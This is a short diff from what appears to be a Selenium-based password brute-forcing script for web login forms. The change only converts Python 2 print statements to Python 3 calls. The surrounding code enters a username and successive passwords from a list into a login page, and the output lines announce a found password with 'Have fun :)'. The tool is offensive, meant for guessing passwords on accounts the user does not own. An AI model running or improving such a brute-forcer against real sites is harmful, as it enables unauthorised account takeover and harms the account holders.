@@ -95,17 +95,17 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 Sel_user.send_keys(username)
                 Sel_pas.send_keys(line)
                 t.sleep(5)
-                print '------------------------'
+                print ('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
-                print '------------------------'
+                print ('------------------------')
                 temp = line 
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             exit()
         except selenium.common.exceptions.NoSuchElementException:
-            print 'AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! '
-            print 'LAST PASS ATTEMPT BELLOW'
-            print color.GREEN + 'Password has been found: {0}'.format(temp)
-            print color.YELLOW + 'Have fun :)'
+            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
+            print ('LAST PASS ATTEMPT BELLOW')
+            print (color.GREEN + 'Password has been found: {0}'.format(temp))
+            print (color.YELLOW + 'Have fun :)')
             exit()
 
 
